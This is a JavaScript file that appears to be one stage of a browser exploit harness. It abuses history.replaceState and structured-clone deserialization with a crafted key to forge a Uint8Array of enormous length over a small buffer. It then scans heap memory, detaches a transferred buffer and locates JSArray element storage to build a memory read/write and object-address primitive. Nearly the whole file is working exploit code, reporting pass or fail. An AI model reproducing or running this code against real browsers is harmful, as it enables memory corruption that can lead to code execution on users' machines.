// Search a wider bounded window for the fixed buffer and reused JSArray
// storage. Require a restored contiguous 64 KiB buffer match; unrelated
// heap-byte changes elsewhere do not count as a mapping failure.
function makeKey() {
  var bytes = [0, 0, 0, 0x16, 0x02, 8];
  for (var i = 1; i < 8; i++) bytes.push(0);
  bytes.push(0xf8);
  for (var j = 1; j < 8; j++) bytes.push(0xff);
  bytes.push(0x13, 3, 0, 0xff, 0xff, 0xff, 0xff);
  var chars = [];
  for (var k = 0; k < bytes.length; k += 2)
    chars.push(String.fromCharCode(bytes[k] | bytes[k + 1] << 8));
  return (chars.join("") + "A".repeat(256)).slice(0, 256);
}
function mark(name) {
  if (api && typeof api.markSync === "function") api.markSync(name);
}
var phase = "build";
var result;
try {
  var backing = new ArrayBuffer(8, { maxByteLength: 16 });
  new Uint8Array(backing).fill(0x41);
  var fixed = new ArrayBuffer(65536);
  new Uint8Array(fixed).fill(0x91);
  var filler = new Array(253);
  filler[0] = BigInt(1) << BigInt(40);
  filler[1] = backing;
  filler[2] = fixed;
  for (var n = 3; n < 27; n++) {
    var neighbor = new ArrayBuffer(8, { maxByteLength: 16 });
    new Uint8Array(neighbor).fill(0x40 + n);
    filler[n] = neighbor;
  }
  for (var j = 27; j < filler.length; j++) filler[j] = {};
  var shared = { marker: 0x51515151 };
  var input = { filler: filler, first: shared, second: shared };
  input[makeKey()] = 0;
  history.replaceState(input, "");
  mark("array_storage_stored");
  phase = "load";
  var output = history.state;
  mark("array_storage_loaded");
  var target = output.filler[1];
  var synthetic = output["\u0000"];
  var cloned = new Uint8Array(output.filler[2]);
  var valid = synthetic instanceof Uint8Array && synthetic.buffer === target &&
    synthetic.byteOffset === 8 && synthetic.length > 1e12 &&
    target.byteLength === 8 && cloned.length === 65536;
  var first = -1;
  var mapped = 0;
  var firstChange = -1;
  var secondChange = -1;
  var firstCount = 0;
  var secondCount = 0;
  var firstPositions = [];
  var secondPositions = [];
  var restored = null;
  var candidates = 0;
  var regionRestored = false;
  var paired = false;
  if (valid) {
    phase = "map";
    var mapLimit = 4194304;
    var mapBaseline = new Uint8Array(mapLimit);
    for (var b = 0; b < mapLimit; b++) mapBaseline[b] = synthetic[b];
    cloned.fill(0xc4);
    var run = 0;
    for (var q = 0; q < mapLimit; q++) {
      if (synthetic[q] !== mapBaseline[q]) {
        mapped++;
      }
      if (synthetic[q] === 0xc4 && mapBaseline[q] === 0x91)
        run++;
      else run = 0;
      if (run === 65536) {
        first = q - 65535;
        candidates++;
      }
    }
    cloned.fill(0x91);
    if (candidates === 1) {
      regionRestored = true;
      for (var rr = first; rr < first + 65536; rr++)
        if (synthetic[rr] !== 0x91) { regionRestored = false; break; }
    }
    mark("array_storage_mapped");
    if (candidates === 1 && regionRestored) {
      var a = { marker: "A" };
      var bObject = { marker: "B" };
      phase = "release";
      structuredClone(0, { transfer: [output.filler[2]] });
      mark("array_storage_detached");
      var array = new Array(8192).fill(a);
      var scanLimit = 4194304;
      var baseline = new Uint8Array(scanLimit);
      for (var s = 0; s < scanLimit; s++) baseline[s] = synthetic[s];
      mark("array_storage_baseline");
      phase = "change_first";
      array[0] = bObject;
      for (var x = 0; x < scanLimit; x++) {
        if (synthetic[x] !== baseline[x]) {
          if (firstChange < 0) firstChange = x;
          firstCount++;
          if (firstPositions.length < 16) firstPositions.push(x);
        }
      }
      array[0] = a;
      phase = "change_second";
      array[1] = bObject;
      for (var y = 0; y < scanLimit; y++) {
        if (synthetic[y] !== baseline[y]) {
          if (secondChange < 0) secondChange = y;
          secondCount++;
          if (secondPositions.length < 16) secondPositions.push(y);
        }
      }
      array[1] = a;
      restored = array[0] === a && array[1] === a;
      if (firstChange >= 0 && secondChange === firstChange + 8 &&
          firstCount <= 8 && secondCount === firstCount && restored) {
        paired = true;
        window.__fw14ArrayState = {
          view: synthetic, index: firstChange, array: array, a: a, b: bObject
        };
      }
      mark("array_storage_done");
    }
  }
  result = { id: "jsarray_storage", status: paired ? "pass" : "fail", details: {
    view_valid: valid, fixed_index: first, mapped_bytes: mapped,
    first_change: firstChange, first_count: firstCount,
    second_change: secondChange, second_count: secondCount,
    positions: firstPositions.join(",") + "|" + secondPositions.join(","),
    restored: restored, paired: paired,
    candidates: candidates, region_restored: regionRestored
  } };
} catch (error) {
  result = { id: "jsarray_storage", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
try { history.replaceState(null, ""); }
catch (error) { result.status = "error"; result.details.cleanup_error = String(error).slice(0, 100); }
return [result];
